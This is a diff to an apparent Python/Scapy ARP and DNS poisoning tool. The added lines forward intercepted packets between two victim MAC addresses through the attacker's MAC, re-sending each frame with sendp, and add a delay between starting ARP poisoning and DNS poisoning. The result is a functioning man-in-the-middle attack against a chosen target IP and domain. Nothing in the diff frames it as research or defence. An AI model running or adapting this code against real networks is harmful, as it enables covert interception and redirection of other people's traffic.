@@ -99,8 +99,20 @@ class DNSPoisonThread(threading.Thread):
     def _analysis(self, packet):
         #Performs checks, whether DNS response contains our gold or not.
 
+        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'b4:2e:99:f4:b7:df':
+           packet[Ether].dst = 'c4:e9:84:9a:14:16'
+           packet[Ether].src = '28:56:5a:49:ff:67'
+           packet[IP].ttl = 255
+
+        if packet[Ether].dst == '28:56:5a:49:ff:67' and packet[Ether].src == 'c4:e9:84:9a:14:16':
+           packet[Ether].dst = 'b4:2e:99:f4:b7:df'
+           packet[Ether].src = '28:56:5a:49:ff:67'
+           packet[IP].ttl = 255
+
         if self.site in packet[DNSQR].qname.decode('UTF-8'):
             packet.show()
+
+        sendp(packet)
 
     def run(self):
         #Only do packet sniffing
@@ -136,6 +148,7 @@ def main(args):
         dns_poison = DNSPoisonThread(site, targetip)
 
         arp_poison.start()
+        time.sleep(5)
         dns_poison.start()
 
         while True:
